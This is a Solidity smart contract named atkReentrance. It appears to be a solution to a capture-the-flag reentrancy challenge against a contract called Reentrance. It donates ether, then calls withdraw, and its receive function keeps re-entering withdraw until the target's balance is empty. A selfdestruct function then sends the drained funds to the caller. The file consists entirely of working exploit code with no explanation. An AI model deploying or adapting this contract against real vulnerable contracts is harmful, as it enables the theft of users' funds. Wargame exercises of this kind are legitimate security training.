// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
	function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}


contract atkReentrance {

   Reentrance public target ;
   uint256 public amount ;
  constructor(address _addressReentrance) {
     target = Reentrance(_addressReentrance);
   }
   

    function callDonate() public payable
    {
      target.donate{value: msg.value}(address(this));
      amount = msg.value;
    }

    function callWithdraw() public
    { 
      target.withdraw(amount);
    }

    function sendFundBack() public
    {
      selfdestruct(payable(msg.sender));
    }

     receive() external payable {
        if (address(target).balance != 0 ) {
        target.withdraw(amount); 
            }
    }
}